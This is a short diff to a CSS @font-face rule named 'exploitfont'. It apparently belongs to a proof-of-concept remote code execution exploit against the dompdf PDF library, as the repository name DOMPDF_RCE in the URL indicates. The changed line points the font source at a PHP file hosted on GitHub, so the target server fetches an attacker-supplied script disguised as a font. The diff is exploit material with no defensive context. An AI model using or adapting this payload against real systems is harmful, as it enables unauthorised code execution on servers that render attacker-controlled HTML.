@@ -1,6 +1,6 @@
 @font-face {
     font-family:'exploitfont';
-    src:url('http://localhost:9001/exploit_font.php');
+    src:url('https://raw.githubusercontent.com/Raptiler/DOMPDF_RCE/main/1/efont.php');
     font-weight:'normal';
     font-style:'normal';
   }
